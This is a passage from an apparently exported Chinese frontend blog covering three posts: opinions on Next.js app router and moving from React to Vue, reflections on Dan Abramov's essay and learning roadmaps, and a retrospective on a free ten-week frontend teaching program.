的東西，很直覺就會理解成是一個在處理 request 之前會執行到的檔案。但文件沒有寫清楚的是，這個 middleware 跟你其他的程式碼，是跑在不同的執行環境的（現在我記得已經有補上了，Next.js 的改版也滿勤快的就是了）。 也就是說在 middleware 裡面寫一個 global.a = 1，你到 Next.js 的 server component 裡面 log 出 global.a，答案會是 undefined。 再者，middleware 並不是跑在完整的 Node.js 環境上面，而是跑在一個叫做 Edge Runtime 的地方，有許多的功能跟 API 都不支援。 之所以這樣搞，是因為 Next.js 預設了這個 middleware 就是要跑在 edge 上，就算我們根本不會用到 edge 這個功能也一樣，而且目前依然沒辦法改變這點，更多討論可以看這一串：Switchable Runtime for Middleware (Allow Node.js APIs in Middleware) #46722。 順帶一提，我目前完全不支持把 Next.js 當一個全端框架來用，也就是前後端專案全都掛在 Next.js 上，理由很簡單，那就是它本來就不適合這樣用。Next.js 它所提供的 server 目前更像是 BFF（Back-end For Front-end），可以當作前端跟其他後端的橋樑，但沒辦法自己實作出完整的功能（除非你的專案很小，功能很少）。 如果真的把後端功能搬到 Next.js 上，那注定是場悲劇。 講完了缺點，來講講優點，那大概就是 bundle size 真的有小一點。例如說 i18n 好了，以往沒有特別做什麼調整的話，大部分的 client 都會下載到「超出目前使用範圍以外」的字串，例如說所有的中文字串，或至少是當前 namespace 底下的字串。 但用了 RSC 以後，由於 server component 的 i18n 在 server 直接做掉了，所以這部分就不需要下載任何額外的字串。 除此之外，其實我沒體驗到太大的好處（而且因為公司專案的一些特性，在搭配上同時有 client 跟 server component 需要考慮，現有的 i18n 套件每一個都有問題，只好自己簡單做了一套） 總之呢，我個人是不太推薦使用 app router 的，帶來的效益遠低於導入的成本，還會把很多事情弄得更複雜。我是從去年七八月就開始用 Next.js 13.4 了，那時候的狀況更糟，文件跟程式碼的行為配對不上的事情也發生過。 如果有人跟我說 Next.js 13.4 以後的 app router 超好用，那我會覺得要嘛是用得不夠多，要嘛是專案很小，所以沒有體驗到壞處，更何況我都還沒講那一堆預設開啟而且有些關不掉的快取策略。 以上就是偷渡的 Next.js RSC 心得，因為從去年七八月就開始用了，其實剛用的那兩三個月最有感，真的很多點可以吐槽，但現在已經有點忘了，我也害怕想起來。 從寫 React 轉去寫 Vue 的感想話說這篇會盡量寫的是 React 與 Vue 本身的心得，而不是特定的函式庫或框架。 舉例來說，如果我原本在 React 都是用 Redux，轉到 Vue 之後用 Pinia，然後寫說：「哇，寫 Vue 真的太棒了啦，Pinia 好簡潔好好用，比 React 好太多了」，這個論述是有問題的，因為在 React 圈其實也有類似的 zustand 可以用。 所以這一句在比較的主體並不是 Vue 與 React，而是 Redux 與 Pinia，變成了特定函式庫的比較，這是這一篇想要避開的論述。 不過為了補充脈絡，還是先把這些函式庫與框架稍微講一下好了，React 的話目前我的起手式大概就是 Next.js 搭配 Zustand 搭配 tailwind，而 Vue 的話就是 Nuxt 搭配 Pinia 搭配 tailwind。 以使用體驗來說，我覺得兩個是差不多的（如果 Next.js 是 page router 的話），所以這部分就不多提了。 再來，使用的感想會與使用經驗多寡以及應用的專案有差，目前手邊大約有 4 個內部的中小型專案都用到 Vue，我寫 Vue 大概寫了四個月左右，其實也沒有很長，另外因為是內部工具，所以都沒有開啟 SSR，直接走純 client side render。 講完了這些前提以後，接著就來講講使用的感想，先來講我自己比較喜歡 Vue 的地方。 先講一下狀態管理的部分。 首先是 Vue 的雙向綁定真的滿香的，v-model 真的好用。以往在 React 都是 value + onChange 都寫，現在用 v-model 一行就搞定了。 而差異最大的我覺得在於 useEffect。在 React 中需要大量用到 useEffect 去處理一些事情，然後要考慮到 dependency 以及各種狀況，一不小心就可能寫壞。 但是在 Vue 中就沒有這種困擾，省了很多心智負擔，你要寫壞其實滿難的。 而這個特性的差異，也讓我對於專案的技術選擇多了一個思考的維度，那就是「下限」。以前我在思考技術時，比較容易思考到「一般的使用狀況」，像是我寫 React 寫久之後，其實不會特別覺得 useEffect 有什麼，寫得也算是順手。 但同時我也承認 useEffect 是一個需要經驗才能寫好的東西，有一定的學習門檻，這也表示它的下限可以很低。寫得爛的工程師，可以寫一堆 useEffect 然後 dependency 亂寫卻維持一個恐怖平衡，東西剛好可以動。若干年後如果我去接手，我會不知道從何改起，因為只要一往裡面加東西，就是整個壞掉，而且還是多個 effect 一起壞掉。 但我自己覺得 Vue 就不同了，你寫得再怎麼爛也就那樣了。同樣都是一個技術能力很差的人來寫，他所寫的 Vue 會比 React 好維護，我是這麼認為的，這就是我所說的「下限」。 那如果現在有個新的團隊，裡面都是前端超級新手，他們寫的專案你過半年之後要維護，已經可以預期到維護性可能會較差的情況下，選擇下限比較高的 Vue 似乎會比較好，至少你改得動。 而另外一個也是從團隊出發的角度是「上手難度」，如果團隊內的人手比較不足，前後端要互相支援的話，那 Vue 也是個會比 React 更好的選擇，因為更好入門，所以就算不熟悉前端也能夠快速上手。 總之呢，從狀態管理來看的話，我覺得 Vue 更直覺也更好上手一點，而 React 的話確實是比較複雜。 接著來談 render 的方式，React 就是 JSX 一路到底，整個 component 就是一個 function，裡面是 JSX。而 Vue 的話則是把 template 跟 functional 分開，我覺得兩者各有其優劣。 對於一些需要 early return 的狀況，例如說如果是載入中就只顯示 loading，React 我覺得會更加直覺一點，就 component 看個前幾行就知道了。而 Vue 的話則是 setup 的地方看完還要再回去看 template 才能確定。 除此之外，v-if 與 v-for 那些其實滿好用的，而且 template 看起來也比較整齊，在結構沒有相差很多的情況下可讀性比較好。 優點講完了，來講一些缺點。 第一個缺點是在 props 的部分我覺得 React 更加直覺，就是 function 的參數而已，而 Vue 的話則是要額外定義，而且在傳入的時候提倡的是 kebab-case，原本叫做 testProps 要改成 test-props，我自己不是很喜歡這樣，因為兩者不一致的話會導致搜尋有點困難。 雖然說我看文件也是可以用 testProps，但官方文件提倡的作法依然是 test-props。 第二個缺點是一個檔案只能有一個 component，我覺得這個滿不彈性的，會容易出現一大堆小的檔案。雖然以前也有人在 React 中提倡這種做法，一個檔案一個 component，但我認為那是不好的，因為有些 component 如果不能被其他元件重用，那就應該放在同個檔案，比較好找也比較好維護。 不過這點似乎也可以解決，我有查到相關的方法： Multiple Components in One File Writing multiple Vue components in a single file 這樣看下來，好像我上面提的兩個缺點其實都有方法可以解決，純粹是我之前對 Vue 不夠熟所以不知道而已，之後再來試試看。 總結以上就是我對使用 Next.js 13.4 app router + RSC 的心得，以及從寫 React 轉到寫 Vue 的心得。 總之呢，感想大概就是 Vue 確實簡單好上手，但還需要再觀察一陣子，畢竟 code 寫得越多才會越有感覺，像我這種只寫了三四個月的，通常還在甜蜜期，只體驗到好處而非壞處。當寫的程式碼愈多，專案也愈複雜的時候，應該就會遇到一些之前沒碰過的問題。 或許要再寫個一兩年才會有更多心得吧？不知道那時候的前端會長成什麼樣子。","link":"/2024/03/13/from-react-to-vue/"},{"title":"從 Redux 作者 Dan Abramov 的文章談前端學習路線圖","text":"前言前幾天看見 Redux 作者 Dan Abramov 寫的這篇：Things I Don’t Know as of 2018，看了之後其實滿有感觸的，前些日子也在思考這種跟自信相關的事情，也做了個簡單的總結，寫下了兩年過後，我能夠被稱為資深工程師了嗎？。 無獨有偶地，這幾天也看到一些 2019 年更新版的學習路線圖，下面依舊有些留言在說「怎麼前端要學那麼多東西」、「怎麼學的完」、「前端好難啊」等等之類的，雖然這兩件事看似沒有關連，但我覺得其實是相關的。 大神沒有你想像中厲害常常會看到許多有名的開發者被稱之為大神，既然會被稱作是大神一定有其原因，可能是每年都會在 conference 上面演講、在社群耕耘許久且貢獻良多、寫過一本很厲害的書等等，在這些方面他們的確很厲害，但大神只是個稱號，終究還是個人，他們在那些擅長的領域很厲害沒有錯，可是不用把他們想成什麼都會。 以下節錄自開頭貼的那篇 Dan Abramov 寫的文章： People often assume that I know far more than I actually do.大家常以為我會的東西很多，但其實沒那麼多 In this post I’ll offer an incomplete list of programming topics that people often wrongly assume that I know. I’m not saying you don’t need to learn them — or that I don’t know other useful things.這篇文章會列出一些大家以為我會但其實我不會的東西，但我不是說這些東西不需要學，也不是說我不知道其他有用的東西 First, there is often an unrealistic expectation that an experienced engineer knows every technology in their field. Have you seen a “learning roadmap” that consists of a hundred libraries and tools? It’s useful — but intimidating.首先，大家對大神們總有一些不切實際的幻想，認為他們在各自的領域中什麼都會。你有看過那些列出一大堆工具跟函式庫的學習路線圖嗎？那很有用沒錯，但也很嚇人 （這邊的翻譯只求意思有到，可能會跟原文有些許偏差） 引太多段就沒意思了，建議大家還是先去看完那篇文章，或是看完我這篇再去也可以，總之一定要去看原文。 如果你不知道 Dan Abramov 是誰，這邊簡單介紹一下，他是 Redux 的作者，後來跑去 Facebook 工作，目前是 React 團隊的成員之一，在他的部落格上會發表一些跟 React 相關的小知識或是其他文章，又強又會寫又熱愛分享，是我個人的 role model。 在上面引用的段落中，他想表達的就是大家都以為一個厲害的開發者什麼都會，他就常被大家以為他會的東西超級多，但其實根本沒有到這麼多，接下來他就列了一大堆自己不會的東西： 完全不會用 docker 對網路的理解知道有 IP 位置、DNS 以及有個通訊協定叫做 TCP&#x2F;IP，就這樣了 不知道 Flexbox 跟 Grid 從來沒學過 SCSS&#x2F;Sass 從沒設定過 HTTPS &#x2F; SSL，只知道跟公鑰與私鑰有關 他舉了二十幾個他不會的東西，有些其實跟後端比較有關，所以我挑幾個跟前端比較有關的（除了 docker）出來而已。 舉了這些他不會或是不熟悉的技能，他希望大家看完文章後能理解的事情是： Even your favorite developers may not know many things that you know.儘管是你很崇拜的開發者，知道的可能還沒有你多（這邊原文 favorite 應該比較像喜愛？但我直覺翻崇拜比較貼近） Regardless of your knowledge level, your confidence can vary greatly.（這句不知道怎麼翻比較好） Experienced developers have valuable expertise despite knowledge gaps.有經驗的開發者儘管還是有很多不懂的，但至少他在某些領域上是專家 文末提到儘管他講了這麼多，也不會貶低自己的價值或是經驗，因為有其他東西是他擅長的，所以他下一篇就寫自己擅長的東西：The Elements of UI Engineering 這給我的啟示是什麼？老實說一開始看到那篇文章我有點嚇到，想說：「哇，原來我會的居然比 Dan 多，至少我用過 docker、我會用 SCSS，我也知道 TCP 的三次握手」，但仔細想想之後發現這句話只對了一半。 對，在 Dan 提出的這些「不擅長」的領域中，我的確懂的比他多，可是這沒辦法推出：「我懂的比他多」，因為在那些他擅長的領域裡面，他有的知識一定屌打我。 例如說對 React 的理解、對開源專案的理解、對 Redux 的理解以及對種種 UI 常見問題的理解，這些絕對都遠遠超過我。 所以結論就是：有什麼好比的呢？ 除了一個人在幾乎所有的領域都比另外一個人厲害以外，似乎也很難說誰懂的比較多。儘管我們把範圍侷限在前端，前端還是包山包海包郵包了一大堆東西，為什麼一定要分出個高下？ 就像我在兩年過後，我能夠被稱為資深工程師了嗎？裡面寫到的，我知道我會很多，但我也知道我不會的很多，每個人都是這樣的。事實上公司也很難找到一個「什麼都會」的人，所以找某個領域的專家比較實在。 你如果讓 Dan 去做那種需要一堆華麗動畫跟特效的網站，還要加上複雜的排版，他可能會做得很差；可是你今天把他放到他擅長的 UI Engineering 的職位，他就能夠做得很出色。 不需要因為自己懂的不多而沒有自信，相反地，你要為了你懂的那些部份而變得有自信。 這跟學習路線圖有什麼關係？現在請你打開 Google Map，定位到自己家附近，然後把方圓三公里之內的範圍都仔細看一遍。 好，裡面每一個點、每一間店你都知道、都有印象嗎？ 沒有？沒關係這很正常，因為這是他媽的地圖啊！ 什麼是地圖？地圖就是把所有東西都標示的清清楚楚的，你越 zoom in 之後東西就越詳細，除了在特定時間才會開啟的時空之門以外，其他細節都在地圖上找得到。 可是就算不知道所有的細節，有問題嗎？沒有問題，我還是知道附近哪間店好吃、該到哪裡去買菜、走這條巷子會比外面大馬路快，對周遭的環境我還是瞭若指掌，只是沒有到 100% 的了解而已。 學習路線圖也是差不多的，上面列了一大堆的知識點、一大堆的專有名詞，我自己也是每次看到都頭昏眼花。但就像我上面所說的，它之所以是路線圖就是因為夠完整、夠詳細，幾乎把所有細節都列出來了，才有資格成為路線圖。 事實上你也可以把其他學科列出這種 roadmap，像是數學，從加減乘除、平方小數、根號對數、二元一次方程式再到微積分，最後再到一些我也不知道是什麼的東西。 路線圖最大的功用在哪？在於讓你有個明確的方向以及概念，讓你知道整個前端的領域大概是長這樣，有這些東西可以學；既然是要給這種大方向的東西，那路線圖當然大的不可思議，把能想到的全部都列出來了。 可是你沒必要每一個都會。 如果只是想踏入這個領域，你把 HTML、CSS 跟 JavaScript 搞好其實就行了，頂多再外加個三大框架之一，剩下的那些都可以暫時忽略，等以後再慢慢補起來。 儘管你已經是開發者了想要繼續加強自己的技術，也沒必要把學習路線圖上面的所有東西學起來。前端學不完沒錯，但不只前端學不完，後端也學不完，寫 Android 跟寫 iOS 的也學不完，這本來就是一件很正常的事情，學得完才比較奇怪，就代表這項技術已經停滯不再發展了，不然怎麼可能學完？ 以後看到那些學習路線圖，你要想的不該是：「唉，前端學不完」，就算沒有路線圖你也學不完，你應該要做的是先看看路線圖，知道有哪些東西可以學，再去學你有興趣的那些技術。 看路線圖不是看六法全書，要你研究每個法條甚至背起來，而是跟看地圖一樣，讓你對地理位置有概念，並且幫助你決定要往哪裡走。 結論學習應該是一件開心的事，我相信 Dan 在解決那些 UI 問題時都很開心，就像我寫每篇技術文章的時候無論花了多少時間、查了多少資料也還是覺得開心。 沒什麼，就因為我熱愛。 最後幫大家做個簡單的條列式總結： 所有領域本來就都學不完，這很正常 挑自己有興趣的部分學，然後成為專家 不要因為自己不會的部份而失去自信，而是要為了自己會的部分產生自信","link":"/2019/01/03/front-end-learning-path/"},{"title":"一場三十人的免費程式教學實驗：成果與檢討","text":"緣起在三個月前，我在 ptt 上 po 文（[分享] 免費程式教學(前端)），說我願意提供一系列的免費程式前端教學。只要是有網頁基礎的都能夠報名，歡迎大家寫信給我，並且附上幾個提問的回答，最後我會挑 5~10 個人進行培訓。 上面所指的提問如下： 自我介紹（例如說背景、怎麼學程式的、程式能力到哪） 學程式多久了，當初為什麼會想學程式 現在在工作嗎？是的話工作內容大概是什麼？ 最近碰到過的一個最難的程式問題 希望我可以給予哪方面的協助 那篇文章是 3&#x2F;2 發出的，報名截止日期到 3&#x2F;11，而 3&#x2F;15 以前會寄信給被我錄取的人 先來講講當初為什麼會想要開這個免費程式教學吧！其實原文裡面也有寫了，我再講得更清楚一點 在這之前，其實我就曾經辦過類似的活動了，雖然也是程式教學，但其實來找我的都是毫無經驗的初學者，我能給的都是一些比較大方向的建議，例如說跟他們介紹什麼是前端、什麼是後端，介紹幾種程式語言，並且推薦給他們適合初學者的。 上一次教學大概接觸了十幾個人，可是卻幾乎沒有一個「真正碰到寫程式」，都僅止於「想學程式但又還沒開始」的階段 可是這不是我想要的，我想要的是實際讓學生們動手寫程式，並且驗證看看「我的方法」是不是真的有效，至於這個方法是什麼，我們稍後會提到。因此，我這次的教學才會把學生限定在「有前端程式基礎」，那代表我可以往更深的地方去教。 爆炸的信箱文章 po 出之後在 ptt 上的迴響還行，大約是 30 幾個推，以軟體工作版這種比較小的板來說算多了。但事實上，報名的人數遠出乎我的意料。 到報名截止日期為止，我一共收到了 42 封信。 是我原本想收的人數的四到八倍左右（原本我只想收 5~10 個），而且有很多人都寫得很不錯。其實，從這些信件就可以看出每一個人的個性了，有些人比較懶，隨便寫個三四行就寄過來；有些人很認真，甚至還提供履歷或者是有精心排版。 那怎麼辦呢？我要怎麼從裡面篩出我要的人？ 算了，太麻煩了，乾脆就全收吧！ 沒錯，我真的是這麼想的。於是，拒絕掉真的不適合的 4 個人以後，最後錄取的有 38 人。 下面附上我當初寄給所有人的錄取通知： Hi, 收到這封信，就代表你已經錄取了。 但其實說「錄取」我自己也覺得有點怪啦，因為並不是什麼正式的活動，辦這個程式教學的初衷就純粹是我希望四五年前我剛接觸前後端網頁程式的時候，也有人能夠這樣帶著我，給我一些建議。 但那個人始終沒有出現，於是在四五年過後，我決定自己跳下來做那個人。 在寫程式的路上一樣受到了很多前輩們的幫助，Google 跟 Stackoverflow 也惠我良多，就是因為受過太多人的幫助，才讓我一直覺得「回饋」是一件我必須要做的事情。 前言差不多就到這邊了，這封信是統一回給大家的，接著會介紹一下之後這個活動的走向。 這次的報名比我想像中的踴躍，大約有 40 位朋友們都對這個活動有興趣，雖然當初文章寫說只收 5~10 位，但仔細考量過後，發現其實每個人的需求都不太一樣，基本上可以把需求分為兩類。 第一類是想要練習前端基礎，希望我能夠出作業或是給一些指導的；第二類則是已經有前端的程式能力，希望能跟我聊聊工作上相關的事情，例如說我是怎麼到新加坡工作，要達到什麼樣的程度等等的。 針對這兩類的需求，會分為兩種方式來進行。 第一類的話大約每週或是每兩週會出一次作業（或者是之後有可能改成作業全部都先出好，大家自己可以有自己的進度），然後固定時間我會統一講解這次作業裡面你應該可以學習到的知識點，再加上我自己的一些補充。 第二類的話基本上能力沒什麼問題，我也沒有甚麼可以教的，所以主要就是跟你們約個時間，然後我們來聊聊天，就當作是參加什麼技術分享會跟隔壁的人聊聊天就好。不用有什麼太大的壓力，聊一聊也可能發現其實你的技術能力比我強。 大家都已經有寄信對我做個簡單的自我介紹了，現在換我來做個簡單的自我介紹。 我叫胡立，現在在新加坡擔任前端工程師，來這邊大約五個月左右而已。 學程式是從升國中的時候開始，一路上基本都自學，小時候寫 VB，長大之後跑去玩程式競賽寫 C&#x2F;C++，之後對手機程式有興趣跑去寫 Java, Android，大學時終於踏上網頁之路學習 PHP 跟前端網頁。實習時候發覺自己對前端比較有興趣，就開始比較專攻前端以及 Node.js 後端開發 更詳細的資料你可以參考我的 Linkedin：https://www.linkedin.com/in/hulii，之後的交流大家也不用太嚴肅，就叫我 huli 或是胡立就好，太嚴肅的話我也會覺得怪怪的XDD 有關於這個教學活動，還有以下幾點要跟大家說明： 你可以「隨時退出」，因為你有可能把我想的太強，但實際教學時卻發現我好像沒那麼強，就跟你的期待有落差。如果碰到這種情況，覺得我沒有辦法給你什麼幫助的話，那你可以直接來跟我說或是怕尷尬的話隨便想個理由也可以。這沒什麼的，不用有什麼壓力。 一定要給我回饋。無論我教得好或是壞，都麻煩大家給我一點回饋，我之後會開一個匿名的 Google 表單讓大家填寫，還麻煩大家在教學結束之後給一下 feedback。 學習還是要靠自己。儘管我可能會給你一些方向，給你一些建議，但畢竟師父領進門，修行在個人，你們之後會變得怎麼樣，就看你們自己了。 就差不多是這樣了，在這邊有兩件事情要請大家幫忙，才能讓我們順利開始 加入 Slack（沒用過的可以自己去 Google 一下教學） 在 Google 表單填寫基本資料（這超級重要，一定要填） 以後 Slack 就是我跟大家溝通的管道了，所以麻煩 Slack 的通知要開一下，如果我在 Slack 上面一直沒回你的話，可以多找我幾次或是一樣寫 email 給我。 現在離四月大概還有三週的時間，我會在這段期間內盡量找「每一個人」聊一聊，如果你是第二類，就是想跟我聊一聊的話，那我們的緣分(?)大概就是聊完就結束了，因為之後我也沒有什麼可以幫的了XD 如果是第一類需要教學的，就大概根據你之前的那篇自我介紹簡單閒聊一下，也會聊到目前對這個教學活動的期待以及更具體地、希望我能夠給予的幫助，教學部份的話預計是從四月初開始，我會再找時間統一跟大家 update 一下最新的狀況。 下面附上初步想出來的第一類的教學大綱，如果你覺得下面這些你都會了，那其實沒什麼必要聽我教學，因為我能教的就這些了XD 我擅長的比較偏 js 而不是 css，所以期待能學到什麼厲害 css 技巧的朋友們可能會失望了，我自己也不太會切版，RWD 也會苦惱很久，在 css 這部分比較不能提供什麼協助。 練習實作 Twitch 遊戲畫面排版（知識點：基本 html, css） 讓畫面變得更動態（知識點：css transition） 改用 Less, Sass 或是 Stylus（知識點：css 預處理器的使用） 串接 Twitch API 拿取資料（知識點：看懂 API 文件、API 串接、Ajax、CORS） 優化：加上 infinite scroll 與 placeholder（知識點：infinite scroll, placeholder） 改用 vanilla js 實作（知識點：vanilla js） 加上多國語言（知識點：i18n, library） 把 CSS, JS 全部都 inline 到 html（知識點：gulp、為什麼需要 gulp） 我們為什麼需要用 Webpack？（知識點：webpack） 改用 React.js（知識點：React.js）（視情況增加 Redux, React-router 等等的教學，因為教學內容可能會變，就沒有先規劃那麼多） 最後幫大家條列式總結一下現在狀況： 加入 Slack，填寫 Google 表單 跟每個人都會先聊聊，但你可以選擇聊完後你要不要參加我上面那些程式課程（就是選第一類的意思） 等待我主動跟你聯絡敲時間在線上聊個天 聊完以後等待通知開課 感謝大家的配合，Huli 一開始的兩週我大概跟 20 個同學一對一聊過了，大約七成用語音三成用文字，就聊一聊彼此的狀況、從什麼時候開始學程式的、程式程度大概到哪邊以及對課程大綱的看法。 其實這個課程最重要的就是課程大綱了，我們馬上來仔細看一下！ 課程大綱背後的涵義會擬出這個課程大綱，主要有兩個因素，第一個是因為裡面教的那些東西，剛好都跟我近期的工作內容有相關，因此教起來我會比較得心應手，畢竟自己就在碰這些東西。 第二個原因是因為我在工作上接觸到這些東西的時候，我原本也是什麼都不懂，不知道 webpack 在幹嘛、不知道 gulp 在幹嘛、不知道 infinite scroll 到底怎麼做。可是當我花一段時間理解之後，我知道為什麼當初的我覺得這麼難了。 因為我不知道是用在哪裡，我不知道是幹嘛的，或是說，我不知道「我為什麼要用」，我在網路上找了一大堆教學，每一篇都在跟我說「怎麼用」，卻很少有資料能告訴我：「為什麼要用」、「如果不用會怎樣」 在幾次教學經驗的累積過後，我找到一個我認為比較有效的教學方式，原則就是： 要先痛到，才會得到 這是什麼意思呢？ 我有一陣子很喜歡看大公司的一些架構文章，裡面寫說他們怎麼把機器架構調整成適合規模化，講說他們碰到了什麼問題，用什麼解法解決了超大資料量所帶來的 Bug。 我一開始覺得很有收穫：「哇，這些感覺好厲害啊，學到很多」。可是過一陣子之後，才發現自己什麼都沒學到。那些東西過一週之後我就全部忘掉了，好像文章根本沒看過一樣。 後來我忘記在哪邊看到一篇文章，裡面有一段傳達的意思我記得特別深刻（如果有人也看過同樣一篇，麻煩在底下留言，小弟感激不盡），文章裡面寫說，那些都是大公司的高手們痛苦過、經歷過所淬煉出來的「精華」，你怎麼可能期望你看了十分鐘，就能夠擁有他們十年的功力？ 「痛過」，是一件很重要的事。 與其直接教他們寫 SCSS，不如先讓他們寫 CSS，然後一直叫他們改顏色，叫他們改東改西。這時候他們就只能一直用文字編輯器尋找-&gt;取代，不斷重複這個循環。等到你確認他們真的痛了，再教他們 SCSS。 這時他們會有種「重獲新生」的感覺，「靠！原來還有這種東西喔，這樣就不用改這麼辛苦了，用變數就可以了」，這樣子的學習方式我認為會比起直接教有效許多。 在教他們一樣東西之前，我一定會想辦法讓他們知道說：「為什麼我需要這個」，我認為當這個問題搞懂也同意之後，才會更有動力去學習，也才能知道自己到底在學什麼，學了之後可以幹嘛。 還有另外一件事，那就是比起每一個不同的小作業，比較好的做法是「一個逐漸加強的作業」，這樣在做作業的時候，學生可以不斷地看見自己的進步，不斷地看見專案的成長，而且最後會做成一個完整的，而不是一堆零碎的、破碎的小專案。 因此，我就以這幾個概念規劃出了這些課程大綱，後來有稍作調整： 基本 HTML&#x2F;CSS 練習：以 Twitch 為例 讓畫面變得更動態：神奇的 CSS transition 寫 CSS 必備神器：CSS 預處理器 從假資料到真資料：Ajax 與 API 串接 讓網頁變得更完整：加上 placeholder 與 infinite scroll 返璞歸真：vanilla js 走向國際：i18n 當我們包在一起：Webpack 節省 Request 的極致：一為全，全為一 改掉你的壞習慣：ESLint 與 standard 第十週原本是 React.js，我後來拿掉了，原因有兩個。第一個是我認為 React 放在這邊不適合，還沒到教的時機點，還不夠「痛」，而且跟前面的也沒有什麼關聯。第二個是我改作業發現很多人的 coding style 不好，所以第十週放這個，前面九週作業寫得越醜的要花越多時間改，讓他們「痛」一下。 我必須先承認，上面這個規劃並沒有很好地使用到「痛到才會得到」這個教學原則，這個是我還可以再做得更好的部分，進步空間還很大很大。 而由一個小作業逐漸加強我覺得我算是滿好的掌握到了，一開始先讓他們刻一個靜態版面，再來把 CSS 換成 SCSS，然後把假資料換成真的資料，串 API。接著加上佔位圖以及無限滾動，讓頻道可以一直滾動加載。 第六週的作業目的是拋棄 jQuery，節省檔案大小，也讓他們知道原來不靠 jQuery 還是可以寫 JavaScript 的。第七週把中文換成中英雙語，可以支援兩個語言，第八週改用 webpack 實作模組化，第九週用 gulp 讓他們知道原來很多事情都可以自動化，最後一週修正自己的 coding style。 這樣子逐漸優化的過程，他們在做下一個作業的時候就可以直接接續上一個，把一個專案變得越來越完整。 解決問題如同我一再強調的，寫程式不是重點，重點在「解決問題」，幾乎所有事情的重點都在這個。 解決問題又可以分成以下幾點來思考： 你要解決什麼問題？ 你用什麼方法解決？ 這個方法有什麼優缺點？ 我很喜歡一個詞叫做 trade-off，中文可以翻作：權衡、取捨。 尤其是在寫程式的領域中，你做什麼事其實都是一種 trade-off，最常見的例子就是時間換空間或空間換時間，沒有那麼好康的事情讓你又有空間又有時間。好啦，其實有，但那都是用錢換來的。 我在每一週的作業說明裡面，都會提到說我們這週碰到了什麼問題。那解法呢？解法當然就是那一週要教大家的東西囉。以下我們把每一週的課程再剖開來看，自問自答上面那三個問題（解決什麼問題、如何解決、優缺點）： 基本 HTML&#x2F;CSS 練習：以 Twitch 為例 解決什麼問題：我想有一個頁面可以看 Twitch 頻道 解決方法：自己寫網頁 優點可以客製化，缺點是花時間 讓畫面變得更動態：神奇的 CSS transition 解決什麼問題：想要加上效果讓頁面更精緻 解決方法：用 css transition 這個屬性來做漸變效果 優點是有了漸變效果，缺點是可能有效能問題 寫 CSS 必備神器：CSS 預處理器 解決什麼問題：寫 css 太麻煩，想要有像程式那樣的變數可以使用 解決方法：用 css 預處理器 優點是方便維護，缺點是需要多一步 compile（像這個時候，就必須衡量優缺點，在這邊顯然優點大過於缺點，因此我們有一個「好理由」採用這個解法） 從假資料到真資料：Ajax 與 API 串接 解決什麼問題：現在的資料都是寫好的，我想要有真實的資料 解決方法：串接 Twitch API 優點是資料變真的了，缺點是看到畫面的速度變慢（如果你要解決這個問題，必定要串接 API，因此這邊的缺點其實可以忽略） 讓網頁變得更完整：加上 placeholder 與 infinite scroll 解決什麼問題：一次載入 100 個頻道太慢，並且在載入時會跑版 解決方法：採用捲動到底才載入新頻道的方式，並且加入佔位圖防止跑版 優點是使用者體驗變好、首次加載變快，缺點是 request 數量變多了 返璞歸真：vanilla js 解決什麼問題：jQuery 檔案大小太大，想減少 request 大小 解決方法：把 jQuery 拿掉，不依賴任何 Library 優點是檔案大小減少，缺點是程式碼複雜度提高，必須自己處理跨瀏覽器問題 走向國際：i18n 解決什麼問題：想要新增一種語言 解決方法：把語言放在語言檔裡，引入之後靠 window 這個全域變數傳遞 優點是可以有多個語言，缺點是污染全域變數 當我們包在一起：Webpack 解決什麼問題：解決上一次作業的全域變數污染，以及想要使用 require 的這種語法 解決方法：導入 webpack 優點是模組化開發，缺點是需要多一層打包，以及檔案大小增加 節省 Request 的極致：一為全，全為一 解決什麼問題：Request 太多 解決方法：把 JavaScript 跟 css 全部 inline 到 html 優點是減少 Request，缺點是開啟頁面的時間變慢 改掉你的壞習慣：ESLint 與 standard 解決什麼問題：寫程式碼的習慣不好，不利於團隊開發 解決方法：導入語法檢查工具 優點是統一程式碼規範，缺點是…好像沒什麼缺點 比起「webpack 是一個打包工具」這種介紹，你讓初學者們知道 webpack 到底是幹嘛的、是要解決什麼問題、要怎麼解決會有用的多。再次強調，問為什麼很重要，知道為什麼也很重要。知道背後的原因，你就可以決定你要不要用這一套解法。 你用一個東西，背後必須要有一個「好理由」。 A：我們改用 TypeScript 吧B：為什麼？A：因為潮啊！ 如果「潮」這個理由不夠有說服力的話而 A 又提不出其他更好的理由，那就沒有必要改用 TypeScript。 之前有一篇很紅的文章，叫做：在 2016 年學 JavaScript 是一種什麼樣的體驗，我覺得有一個很可惜的點，那就是有些人看完之後的心得都只有：「唉，對啊！前端現在也太複雜了吧！」 但我覺得這篇文章你應該去思考的是：「裡面那些工具是不是真的需要用到？那些工具想解決的問題，到底是不是我碰到的問題？」，這才是這篇文章的重點。 舉例來說，裡面有一段這樣寫： 可別用 jQuery！現在哪還有人用 jQuery。現在是 2016 年了，你絕對應該用 React。 這個理由跟上面的一樣薄弱，一個字：潮！ 當然，他也可能是其他意思，也有可能是想表達說 React 是近年趨勢，jQuery 可能會慢慢被淘汰並且不再維護，以後就有維護性的問題。這時候你就可以考慮說：這樣的情形是不是有可能發生？如果真的發生的話，會有怎樣的影響？用 React 帶來的複雜性跟 jQuery 的可維護性哪一個損害較小？ 總之呢，重點應該是「你要解決什麼問題，這問題用哪些工具來輔助最適合」，而不是一味的覺得前端怎麼那麼複雜那麼多東西。 是啊，本來就一堆東西啊，可是裡面可能有八成你根本用不到啊！ 如果你寫一個一頁式的行銷 landing page 還硬要用 React + Redux + Rx + Webpack 的話，那我也是醉了。 課程進行方式這堂課程的進行方式是這樣的，如上所述，總共十個作業，每一個作業一週，必須「先做作業」，但做不出來也沒關係。每個禮拜二我會直播講解上一週作業並且實際示範如果是我的話，我會怎麼做。 會這樣規劃是因為「自學」無論在哪個領域，都是一個重要的技能。我想先讓同學們對於我要教的內容有概念，甚至是把作業做出來以後，我再重新講解一遍。我覺得唯有這樣，才能讓同學們對我教的東西更熟悉。 這就呼應到我上面提過的「要先痛到，才會得到」，事後有很多同學都反應他們課前預習時覺得有些東西好難，怎麼看都看不懂。可是一看完我的直播教學，就有種茅塞頓開的感覺：「哇！原來這麼簡單」。 如果相反過來呢？假如是我先上課，他們就只會覺得：「喔，是這樣寫」，接著寫作業的時候就直接抄我的解法就好了。他們學到了什麼？學到模仿我的程式碼，然後過一個禮拜完全忘記這個解法。為什麼？因為他們沒有痛過，所以沒有去思考。 來，再次強調，你寫程式的時候要思考！要思考！要思考！只有思考過，深思熟慮過的東西才是你的，你才記得住。 